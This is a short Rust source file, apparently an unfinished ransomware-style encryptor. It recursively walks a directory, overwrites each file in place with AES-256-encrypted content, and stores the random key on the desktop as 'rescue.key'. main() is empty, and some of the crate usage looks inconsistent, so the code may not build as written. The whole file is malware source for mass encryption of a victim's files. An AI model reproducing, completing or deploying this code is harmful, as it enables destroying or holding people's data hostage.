use std::io::Write;
use std::path::{Path, PathBuf};
use std::fs::{read,write,OpenOptions};

use rand::{Rng, thread_rng};
use aes::Aes256;
use aes::cipher::{Key, KeyInit, StreamCipher};
use dirs::desktop_dir;
use walkdir::WalkDir;
use aesstream::AesWriter;


fn fetch_files
(origin: &str) -> (){
    if let Some(mut desktop) = desktop_dir(){
        let path_walk = WalkDir::new(origin)
            .into_iter()
            .filter_map(|e| e.ok())
            .filter(|e| e.file_type().is_file());

        let key_generated:[u8;32] = key_generator(&mut desktop);

        let enrcyptor = &Aes256::new(<&Key<Aes256>>::from(&key_generated));

        for file in path_walk{
            enrcyt_target_file(file.path(), &enrcyptor);
        }
    }
}

fn enrcyt_target_file(path: &Path, encryptor: &Aes256) -> (){
    if let Ok(file) = OpenOptions::new().write(true).open(path){
        if let Ok(content) =read(path){
            if let Ok(mut writer) = AesWriter::new(file,encryptor){
                let _ = writer.write_all(&content);
            }
        }
    }
}

fn key_generator(desktop: &mut PathBuf) -> [u8; 32] {
    let key: [u8;32]  = thread_rng().gen();

    desktop.push("rescue.key");
    write(desktop,key)
        .expect("Failed to write key to file");
    return key;
}

fn main() {

}
